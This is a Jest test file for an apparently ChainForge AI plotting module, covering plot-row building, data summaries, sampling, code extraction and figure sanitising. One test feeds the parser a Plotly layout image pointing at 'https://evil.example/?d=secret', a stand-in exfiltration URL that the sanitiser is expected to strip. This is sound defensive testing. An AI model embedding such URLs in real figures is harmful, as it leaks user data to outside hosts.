/*
 * @jest-environment jsdom
 */
jest.mock("../cache", () => ({
  __esModule: true,
  default: class StorageCache {},
  StringLookup: { get: (x: unknown) => x },
  MediaLookup: {},
}));
jest.mock("@google/genai", () => ({ GoogleGenAI: jest.fn() }));
jest.mock("../pyodide/exec-py", () => ({ execPy: jest.fn() }));
jest.mock("../../store", () => ({
  __esModule: true,
  default: { getState: () => ({ AvailableLLMs: [] }) },
}));
jest.mock("../backend", () => ({ queryLLM: jest.fn() }));

// eslint-disable-next-line import/first
import { describe, expect, test } from "@jest/globals";
// eslint-disable-next-line import/first
import {
  buildPlotRows,
  describePlotData,
  extractCode,
  PlotRow,
  sampleRepresentativeRows,
} from "../aiPlots";
// eslint-disable-next-line import/first
import { parseFigure } from "../plotSandbox";
// eslint-disable-next-line import/first
import { LLMResponse } from "../typing";

const response = (
  llm: string,
  country: string,
  texts: string[],
  scores: boolean[],
): LLMResponse =>
  ({
    uid: `${llm}-${country}`,
    llm,
    prompt: `Capital of ${country}?`,
    vars: { country },
    metavars: { LLM_0: llm, source: "atlas" },
    responses: texts,
    eval_res: { items: scores, dtype: "Categorical" },
  }) as unknown as LLMResponse;

describe("plot rows", () => {
  test("one row per response, with its own evaluation result", () => {
    const rows = buildPlotRows([
      response("GPT", "France", ["Paris", "Lyon"], [true, false]),
    ]);
    expect(rows).toEqual([
      {
        llm: "GPT",
        prompt: "Capital of France?",
        response: "Paris",
        vars: { country: "France" },
        // ChainForge's internal metavars are left out
        metavars: { source: "atlas" },
        eval: true,
      },
      expect.objectContaining({ response: "Lyon", eval: false }),
    ]);
  });

  test("the description counts values and summarizes scores", () => {
    const rows = buildPlotRows([
      response("GPT", "France", ["Paris", "Lyon"], [true, false]),
      response("Claude", "France", ["Paris"], [true]),
    ]);
    const described = describePlotData(rows);
    expect(described.rows).toBe(3);
    expect(described.llm).toEqual({
      distinct: 2,
      values: { GPT: 2, Claude: 1 },
    });
    expect(described.vars.country.distinct).toBe(1);
    expect(described.eval).toEqual({ type: "boolean", true: 2, false: 1 });
  });
});

describe("representative sample rows", () => {
  test("cover every LLM, every variable value, and each score", () => {
    const resps: LLMResponse[] = [];
    for (const llm of ["A", "B", "C"])
      for (const country of ["France", "Peru", "Japan"])
        resps.push(
          response(llm, country, Array(10).fill("x"), [
            ...Array(9).fill(true),
            false,
          ]),
        );
    const rows = buildPlotRows(resps);
    expect(rows).toHaveLength(90);

    for (let trial = 0; trial < 20; trial++) {
      const sample = sampleRepresentativeRows(rows, 8);
      expect(sample).toHaveLength(8);
      expect(new Set(sample.map((r) => r.llm))).toEqual(
        new Set(["A", "B", "C"]),
      );
      expect(new Set(sample.map((r) => r.eval))).toEqual(
        new Set([true, false]),
      );
      expect(new Set(sample.map((r) => r.vars.country)).size).toBe(3);
    }
  });

  test("small data is sent whole", () => {
    const rows = [{ llm: "A" }, { llm: "B" }] as PlotRow[];
    expect(sampleRepresentativeRows(rows, 8)).toBe(rows);
  });
});

describe("plot code and figures", () => {
  test("the plot function is pulled out of the model's reply", () => {
    expect(
      extractCode(
        "Here:\n```javascript\nconst x = 1;\n```\n```js\nfunction plot(rows) { return {data: []}; }\n```",
      ),
    ).toBe("function plot(rows) { return {data: []}; }");
    expect(extractCode("I can't do that.")).toBeUndefined();
  });

  test("figures must have data, and can't load things from the web", () => {
    expect(() => parseFigure('{"layout": {}}')).toThrow(/data/);
    expect(() => parseFigure('{"data": [{"type": "scattermapbox"}]}')).toThrow(
      /Map/,
    );
    expect(() =>
      parseFigure('{"data": [{"type": "image", "source": "https://x"}]}'),
    ).toThrow(/image/);
    expect(
      parseFigure(
        JSON.stringify({
          data: [{ type: "bar", x: [1] }],
          layout: {
            title: "T",
            images: [{ source: "https://evil.example/?d=secret" }],
            template: { layout: { images: [] } },
          },
        }),
      ),
    ).toEqual({ data: [{ type: "bar", x: [1] }], layout: { title: "T" } });
  });
});
